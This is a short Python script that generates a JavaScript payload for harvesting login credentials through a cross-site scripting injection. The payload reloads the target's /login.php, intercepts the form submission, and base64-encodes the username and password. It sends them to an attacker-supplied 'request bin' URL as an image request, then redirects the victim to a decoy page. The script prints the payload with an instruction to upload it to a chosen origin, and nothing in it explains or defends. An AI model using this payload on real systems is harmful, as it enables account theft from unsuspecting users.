template = '(async()=>{document.body.innerHTML='';document.write(await fetch("/login.php").then(e=>e.text())+`<script>a=setTimeout,a(()=>$("form[action*=login]").submit(e=>{e.preventDefault(),c=e.currentTarget,(new Image).src="%s"+btoa(c[0].value+"||"+c[1].value),a(()=>window.location="%s",1e3)}),4e3)</script>`)})()'

bin = input('request bin url: ')
comfort = input('comfort url: ')
code = template % (bin, comfort)
origin = input('origin: ')

print(f'upload the following code to {origin}\n')
print(f'{code}\n')
